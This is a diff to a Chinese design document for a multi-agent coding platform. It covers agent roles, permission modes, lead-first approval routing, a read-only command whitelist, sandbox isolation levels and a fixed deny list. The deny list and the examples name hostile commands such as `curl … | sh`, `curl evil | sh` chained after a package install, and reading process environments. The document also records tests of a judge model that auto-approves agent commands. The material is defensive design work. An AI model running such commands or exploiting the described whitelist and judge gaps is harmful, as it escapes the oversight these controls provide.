@@ -191,7 +191,7 @@ Go 写的控制台（REST + SSE + 节点 WebSocket + 调度器）存全部状态
 | --- | --- | --- | --- | --- | --- | --- |
 | 项目统筹（coordinator） | 项目 1 个 | Claude，常驻 | `projects/<pid>/coordinator`（空目录，不克隆） | `tools: []`（一个内置工具都没有） | `permissionMode:'dontAsk'` + PreToolUse 钩子只放行 `mcp__platform__*` | coordinator |
 | 组长（lead） | 讨论串 1 个 | Claude（或 Codex），常驻 | `projects/<pid>/threads/<no>/lead`（讨论串分支的 worktree） | `Read, Glob, Grep, Bash` | `dontAsk`；`disallowedTools: Edit, Write, NotebookEdit`；**只读策略**（§10.2：Bash argv 白名单 + Claude Bash 沙箱无可写路径 + 文件工具限 cwd） | lead |
-| 成员（member） | 讨论串 × 岗位 × count | Claude 或 Codex，常驻 | `projects/<pid>/threads/<no>/<name>`（分支 `thread/<no>/<name>`） | 按岗位模板 | `default`（审批走 canUseTool → 网页卡片）；岗位“跳过权限确认”= `bypassPermissions`；岗位 `read_only`（审查岗、决策岗默认开）= 与组长相同的只读策略 | member（+ `can_delegate` 时有派子任务） |
+| 成员（member） | 讨论串 × 岗位 × count | Claude 或 Codex，常驻 | `projects/<pid>/threads/<no>/<name>`（分支 `thread/<no>/<name>`） | 按岗位模板 | 岗位 `permission_mode`（§9.1）：`auto`（默认）= Claude Code 的判断模型自动放行或拦下，拿不准的走 canUseTool → 审批路由；`ask` = `default`（除读文件外都走 canUseTool）；`bypass` = `bypassPermissions`（只在隔离节点，否则按 `auto`）；岗位 `read_only`（审查岗、决策岗默认开）= 与组长相同的只读策略（`dontAsk`，与权限模式无关） | member（+ `can_delegate` 时有派子任务） |
 
 Codex 对应：组长和 `read_only` 岗位 `sandbox: read-only, approvalPolicy: never`；成员 `sandbox: workspace-write, approvalPolicy: on-request`，并在 `thread/start.config` 里设 `sandbox_workspace_write.writable_roots = [<shared>/.git]`（worktree 的对象库和 refs 在共享克隆的 `.git` 里，不在 cwd 下，否则每次 `git commit` 都会被沙箱拦或弹审批）和 `sandbox_workspace_write.network_access = true`（装依赖需要；推送不靠它，见 §8.1）；跳过确认 = `danger-full-access + never`。P3 的 SDK/Codex 验收脚本要实测 Codex 成员在 worktree 里能 `git commit`。
 
@@ -232,7 +232,7 @@ Codex 会话 ──(http://127.0.0.1:<port>/mcp/<sid>/<每次 ─┘            
 平台工具清单（在 v1 / threads.md 基础上）：
 
 - **coordinator**：`open_thread(title, brief, roles?)`、`list_threads(status?)`、`thread_status(no)`、`message_thread(no, text)`、`ask_user(question, options?)`（不阻塞）、`remember(text)`、`set_status(text, kind?)`。
-- **lead**：`update_plan(steps)`（主任务）、`assign_task(assignee, instruction, main, depends_on?, kind?)`（assignee 可以是岗位名 → 进任务池）、`list_tasks`、`cancel_task`、`reply_to(question_id, answer)`、`broadcast`、`send_message`、`ask_user`（不阻塞）、`enqueue_merge(member | task_id)`（进合并队列，取代 v1 设计里的 `merge_member` 直接合并）、`open_pr(title, body)`、`finish(summary)`、`publish_deliverable(kind, title, url)`、`publish_file(path, kind, title, deliverable_id?)`（§6.5）、`set_status`。`finish(summary)` 除了写 `at_threads.summary`，还插入一条 `at_project_memory {source: '#<no>', text: summary}` 并发 `memory` 事件（threads.md 的约定）。
+- **lead**：`update_plan(steps)`（主任务）、`assign_task(assignee, instruction, main, depends_on?, kind?)`（assignee 可以是岗位名 → 进任务池）、`list_tasks`、`cancel_task`、`reply_to(question_id, answer)`、`review_permission(request_id, decision: allow|deny|ask_user, reason)`（成员的权限请求，§9.2）、`broadcast`、`send_message`、`ask_user`（不阻塞）、`enqueue_merge(member | task_id)`（进合并队列，取代 v1 设计里的 `merge_member` 直接合并）、`open_pr(title, body)`、`finish(summary)`、`publish_deliverable(kind, title, url)`、`publish_file(path, kind, title, deliverable_id?)`（§6.5）、`set_status`。`finish(summary)` 除了写 `at_threads.summary`，还插入一条 `at_project_memory {source: '#<no>', text: summary}` 并发 `memory` 事件（threads.md 的约定）。
 - **member**：`complete_task(task_id, summary, artifacts?)`（**显式完成**，见 §7.3；调用前平台先替它推送分支，见 §8.1）、`push_branch()`（把当前 worktree 的 HEAD 推到自己的成员分支，见 §8.1）、`report_progress`、`ask_lead`（阻塞）、`ask_user`（阻塞）、`send_message`、`read_messages`、`list_team`、`get_task`、`request_review`（阻塞）、`publish_deliverable`、`publish_file`（§6.5）、`set_status`；`can_delegate` 时加 `assign_subtask`、`wait_task`。
 - 审批不再是 MCP 工具（v1 的 `approve`），改走 canUseTool / Codex requestApproval（§8）。
 
@@ -372,11 +372,33 @@ Claude 子进程                守护进程                      控制台     
 
 - **Claude**：`canUseTool` 返回的 Promise 一直挂着（SDK 说明无等待上限）。`allow_always` → 返回 `updatedPermissions = options.suggestions`（每条的 `destination` 一律改写为 `session`），同时控制台把这些 `PermissionUpdate` **原样**存进 `at_permission_rules.sdk_update`；以后同一员工（或规则范围内的员工）每次 `session.open`/resume，控制台把范围内的 `addRules`/`allow` 规则展开成 `claude.allowed_tools`（如 `Bash(pnpm add:*)`）下发，由 **Claude 自己的规则匹配器**判断（它正确处理 `&&`、`;`、`|`、`$()` 等复合命令和路径规则）。拒绝 → `{behavior:'deny', message:'用户拒绝了这个操作：<理由>'}`。`opts.signal` 中止（回合被打断 / 会话关闭）→ 守护进程发 `approval.cancel`，卡片变“已取消”。**绝不返回 `null`**（会让工具永远卡住）。
 - **Codex**：`item/commandExecution/requestApproval`、`item/fileChange/requestApproval`、`item/permissions/requestApproval`、`mcpServer/elicitation/request` 都映射为同一种 `approval.request`（带 `kind` 和原始参数，fileChange 附 diff）。答复映射：allow → `accept`、allow_always → `acceptForSession`、deny → `decline`。收到 `serverRequest/resolved` → 视同 cancel。
-- **策略顺序**（控制台 `approvals.Decide`）：⓪ **固定拒绝名单**（无论哪条策略都先过它，见 §10.3：读取或改动守护进程目录、`node.env`、凭证文件、其他项目目录，`curl|wget` 管道到 shell 等；命中直接 deny 并告警）→ ① 岗位 `skip_permissions`（这种会话本就以 bypass 模式开，正常不会来；来了直接放行并告警）→ ② 讨论串 `auto_approve`（“本讨论串内全部放行”，只在节点隔离级别满足 §10.3 时可开）→ ③ `at_permission_rules` 的**精确匹配**：同一工具且输入的规范化 hash 相同（`input_hash`），或该工具没有有意义的参数（例如某个平台外 MCP 工具整体放行）。**控制台不解析、不匹配 Claude 规则字符串**（`Bash(pnpm add:*)` 这类前缀规则只交给 Claude 本身，见上；用 Go 重写匹配器会放过 `pnpm add x && curl evil | sh`）→ ④ **只读命令白名单**（`approvals/readonly.go`，`decided_by = policy:rule:builtin-read-only`）：只对只读岗位（`read_only`、`gate: review|decision` 的审查/决策岗位，以及组长）生效，只看 `Bash`（及 Codex 的字符串 `shell`）命令。按 shell 规则切词，出现任何操作符、重定向、`$` / 反引号展开、`!`、`#`、换行（单引号里的除外；双引号里的 `$`、反引号、`\`、`!` 也算）就不算；参数里有绝对路径、`~` 开头或 `..` 也不算（只读工作目录；短选项后直接带的值如 `-f/etc/x` 也算）；未加引号的通配符：能匹配到 `.`/`..` 的（`.*`、`.?`、方括号）一律不算，`find`、`sed`、`rg`、`git`、`tail` 带未加引号的通配符也不算（仓库里叫 `-delete`、`--pre=x` 的文件会被展开成选项）；被拒的选项按 git 的缩写规则匹配（`--outp=` 等同 `--output=`），短选项合写（`rg -nz`）也算；剩下的命令必须是 `ls`、`cat`、`head`、`tail`（不带 `-f`）、`wc`、`pwd`、`grep`、`rg`（不带 `--pre`、`-z`、`--hostname-bin`）、`find`（不带 `-exec`/`-delete`/`-fprint` 等）、`sed -n <行号范围>p 文件…`、`git log|status|diff|show|rev-parse|ls-files|blame|merge-base`（不带 `--output`、`--ext-diff`、`--textconv`、`--git-dir` 等）或列表形式的 `git branch`。写操作永远不会被它放行 → ⑤ 出卡片。
-- **“本讨论串内全部放行”打开时**：控制台对该串所有 Claude 会话发 `session.set_mode {permission_mode:'acceptEdits'}`（文件编辑免问；其余仍走策略 ② 自动放行），并把当前所有待审批一次性放行（仍先过 ⓪）。关闭时改回 `default`。这样大部分请求在节点本地就不再往返。
+- **策略顺序**（控制台 `approvals.Decide`）：⓪ **固定拒绝名单**（无论哪条策略都先过它，见 §10.3：读取或改动守护进程目录、`node.env`、凭证文件、其他项目目录，`curl|wget` 管道到 shell 等；命中直接 deny 并告警）→ ① 岗位 `permission_mode: bypass` 且节点隔离（这种会话本就以 bypass 模式开，正常不会来；来了直接放行并告警）→ ② 讨论串 `auto_approve`（“本讨论串内全部放行”，只在节点隔离级别满足 §10.3 时可开）→ ③ `at_permission_rules` 的**精确匹配**：同一工具且输入的规范化 hash 相同（`input_hash`），或该工具没有有意义的参数（例如某个平台外 MCP 工具整体放行）。**控制台不解析、不匹配 Claude 规则字符串**（`Bash(pnpm add:*)` 这类前缀规则只交给 Claude 本身，见上；用 Go 重写匹配器会放过 `pnpm add x && curl evil | sh`）→ ④ **只读命令白名单**（`approvals/readonly.go`，`decided_by = policy:rule:builtin-read-only`）：只对只读岗位（`read_only`、`gate: review|decision` 的审查/决策岗位，以及组长）生效，只看 `Bash`（及 Codex 的字符串 `shell`）命令。按 shell 规则切词，出现任何操作符、重定向、`$` / 反引号展开、`!`、`#`、换行（单引号里的除外；双引号里的 `$`、反引号、`\`、`!` 也算）就不算；参数里有绝对路径、`~` 开头或 `..` 也不算（只读工作目录；短选项后直接带的值如 `-f/etc/x` 也算）；未加引号的通配符：能匹配到 `.`/`..` 的（`.*`、`.?`、方括号）一律不算，`find`、`sed`、`rg`、`git`、`tail` 带未加引号的通配符也不算（仓库里叫 `-delete`、`--pre=x` 的文件会被展开成选项）；被拒的选项按 git 的缩写规则匹配（`--outp=` 等同 `--output=`），短选项合写（`rg -nz`）也算；剩下的命令必须是 `ls`、`cat`、`head`、`tail`（不带 `-f`）、`wc`、`pwd`、`grep`、`rg`（不带 `--pre`、`-z`、`--hostname-bin`）、`find`（不带 `-exec`/`-delete`/`-fprint` 等）、`sed -n <行号范围>p 文件…`、`git log|status|diff|show|rev-parse|ls-files|blame|merge-base`（不带 `--output`、`--ext-diff`、`--textconv`、`--git-dir` 等）或列表形式的 `git branch`。写操作永远不会被它放行 → ⑤ 出卡片，按项目的审批方式路由（§9.2）：先给组长判断，或直接给用户。
+- **“本讨论串内全部放行”打开时**：控制台对该串所有 Claude 会话发 `session.set_mode {permission_mode:'acceptEdits'}`（文件编辑免问；其余仍走策略 ② 自动放行），并把当前所有待审批（包括正在等组长判断的）一次性放行（仍先过 ⓪）。关闭时改回各自岗位的模式（`auto` / `default`；bypass 会话不动）。这样大部分请求在节点本地就不再往返。
 - **断线**：守护进程重连后重发所有**仍挂着**的 `approval.request`（同 `approval_id` 幂等）；控制台重发所有已决定但未 `ack` 的 `approval.resolve`。
 - **进程重启后的孤儿卡片**：`canUseTool` 的 Promise 和 app-server 的 JSON-RPC 请求随进程消失（守护进程重启、app-server 重启、会话崩溃后自动 resume）。守护进程重启时丢弃发件箱里对应 Promise 已不存在的 `approval.request`/`tool.call`，改发 `approval.cancel {reason:'process_restarted'}` / `tool.cancel`；控制台收到 `sessions.report` 或 `session.state crashed|parked|closed` 时，把该会话所有不在报告 `pending_approvals` 里的 open 审批标 `cancelled`（卡片显示“已失效，员工如仍需要会重新申请”）。阻塞型提问的调用死掉时提问**不取消**：用户之后的答复按非阻塞退路以 `session.send {kind:'answer'}` 送达（§6.3）。
-- **超时**：默认不超时。项目设置可配 `approval_timeout`（例如 8 h），到期按 deny 处理并通知组长。
+- **超时**：默认不超时。项目设置可配 `approval_timeout_s`（例如 8 h），到期按 deny 处理；从卡片出现在用户面前算起（组长转交的卡片从转交时算）。
+
+### 9.1 岗位的权限模式
+
+`at_roles.permission_mode`（迁移 00096 把旧的 `skip_permissions=true` 改成 `bypass`，其余岗位改成 `auto`；`at_employees.spec` 里的岗位副本同样改写）。统筹永远只有平台工具（`dontAsk` + 拒绝非平台工具）；只读岗位（组长、`read_only`、审查/决策岗）永远 `dontAsk` + 只读策略，权限模式对它们不生效，`auto` 不会给它们写权限。
+
+| 模式 | Claude | Codex |
+| --- | --- | --- |
+| `auto`（默认） | `permissionMode: 'auto'`（SDK 0.3.325）：判断模型自动放行或拦下每个调用，拿不准时才调 `canUseTool`。守护进程的 PreToolUse 钩子再把**写到工作目录外**的 Edit/Write/MultiEdit/NotebookEdit 改成 `ask`，强制走 `canUseTool`（实测判断模型会放行按指令写 `~/.bashrc.d/…` 这类文件）；固定拒绝名单仍由钩子先拦。只发给 hello `features` 里有 `permission_auto` 的守护进程，旧守护进程上按 `default` 开 | `workspace-write` 沙箱 + `approval_policy: on-request`（Codex 自己决定何时申请） |
+| `ask` | `default`：除读文件外每个调用都走 `canUseTool` | `workspace-write` + `untrusted`（只有它信任的只读命令免申请） |
+| `bypass` | 节点为 `agent_user` 级别或标记 `isolated` 时 `bypassPermissions` + `allowDangerouslySkipPermissions`；否则按 `auto` 开，岗位页面说明原因 | 隔离节点上 `danger-full-access` + `never`；否则同 `auto` |
+
+实测（SDK 0.3.325，`permissionMode: 'auto'`，真实调用）：`ls -la .` 直接执行，没有调用 `canUseTool`；用户指令里明确要求的 `git push --force`、`curl … | sudo sh`、往工作目录外写文件也被判断模型放行；同样的命令出自文件内容（不是用户要求）时被判断模型直接拒绝，同样不经过 `canUseTool`。PreToolUse 钩子返回 `ask` 时一定会走 `canUseTool`（上面的工作目录外写入规则依赖这一点）。所以 `auto` 下真正到达审批流程的请求很少，主要是钩子要求询问的、平台外 MCP 工具里判断模型拿不准的。
+
+### 9.2 审批路由：组长先判断
+
+项目设置“审批方式”（`delivery.approval_routing`）：`lead_first`（默认，“组长先判断，拿不准再问我”）或 `user`（“全部问我”）。
+
+- 策略 ⓪–④ 都没定下来的卡片，在 `lead_first` 下 `audience = 'lead'`，组长收到一条消息 `[Permission request q5 from dev-1 · t3]`，内容只有用户卡片上显示的东西（工具名、标题、说明、原因、命令或参数，参数截断到 2000 字），再无其他会话信息。用户的“等你处理”列表、讨论串的 `waiting` 状态都不算这些卡片。
+- 组长调用 `review_permission(request_id, decision, reason)`：`allow` / `deny` 直接 `approval.resolve`（`deny` 的理由发给成员）；`ask_user` 把卡片转给用户（`audience = 'user'`，卡片上写“组长 lead-1 拿不准：理由”）。
+- 直接给用户的情况：项目设置 `user`；请求来自组长自己（或没有讨论串的会话）；组长在 `lead_review_timeout_s`（默认 120 秒，可选 1/2/5/10 分钟）内没有判断（控制台每 15 秒扫一次）。
+- 用户的选择（放行 / 总是允许 / 拒绝并写理由）照旧回到请求者；“全部放行”同样放行正在等组长的卡片。
+- 记录：`at_questions.decided_by` 写 `lead:<名字>` / `user:<id>` / `policy:…`，组长的判断和理由另存 `detail.review = {by, decision, reason}`。每次判断都写一行讨论串动态（“lead-1 放行了 dev-1 的请求 Bash npm test（理由）”“你 拒绝了 …”“平台 组长 lead-1 没有及时判断 …”），讨论串的“审批记录”列出最近的判断和判断人。发给守护进程的 `approval.resolve.decided_by` 对组长的判断写 `policy:rule:lead-review`（协议的取值范围不变，旧守护进程也能接收）。
 
 ## 10. 安全模型
 
@@ -424,7 +446,7 @@ Claude 子进程                守护进程                      控制台     
 | `sandbox` | 同一用户，但：Claude 会话开启 **Claude Code 的 Bash 沙箱**（`settings.sandbox.enabled = true`，`allowUnsandboxedCommands = false`，`filesystem.denyRead` = 守护进程配置目录、`state/`、`$XDG_RUNTIME_DIR/agent-teams`、其他项目目录、`~/.claude/.credentials.json`、`$CODEX_HOME`；可写路径只有 cwd 和共享克隆的 `.git`），并通过 `settings.permissions.deny` 给 Read/Edit 加同样的路径拒绝，PreToolUse 钩子再把文件工具限制在 cwd 内。员工专用 `HOME=<root>/agent-home/`（不含任何凭证）；Claude 登录通过 `CLAUDE_CONFIG_DIR` 指向守护进程目录，只有 claude 进程本身能读，沙箱里的命令读不到。`node.env`（`~/.config/agent-teams/`，0600）所在目录同样在 `denyRead` 和 Read 拒绝规则里 | Claude 员工除“跳过权限确认”外的全部功能（含“本讨论串内全部放行”）；**Codex 员工不派到这类节点**（Codex 沙箱只限写不限读，命令读凭证不需要审批，见 §15 R9） |
 | `none` | 探测不到 bwrap/用户命名空间，也没有 `at-agent` | 不允许“跳过权限确认”和“本讨论串内全部放行”（开关在网页上置灰并说明原因）；审批策略 ⓪ 的固定拒绝名单始终生效；Codex 员工不派到这类节点 |
 
-- 岗位的 `skip_permissions` 只派到 `agent_user` 级别或明确标记 `isolated`（整台机器/容器只给员工用、不放其他秘密）的节点；讨论串的 `auto_approve` 要求该串所有员工所在节点至少是 `sandbox` 级别。岗位保存和开关打开时都检查，不满足时报错说明。
+- 岗位的 `bypass` 只在 `agent_user` 级别或明确标记 `isolated`（整台机器/容器只给员工用、不放其他秘密）的节点上生效；派到其他节点时按 `auto` 开（审批也不会被当作 bypass 放行），岗位页面和 `GET /api/roles` 的 `warnings` 说明原因。讨论串的 `auto_approve` 要求该串所有员工所在节点至少是 `sandbox` 级别，开关打开时检查，不满足时报错说明。
 - 固定拒绝名单（策略 ⓪，§9）：Read/Edit/Bash 涉及上述秘密路径；`curl|wget … | sh`；`git config` 改 `core.hooksPath`/`credential.*`；读 `/proc/*/environ`。名单写在控制台代码里，守护进程的 PreToolUse 钩子也用同一份名单先拦一道。
 - 平台的 git 钩子目录（`core.hooksPath`，§8.1）和 gh 包装脚本放在员工不可写的目录。
 
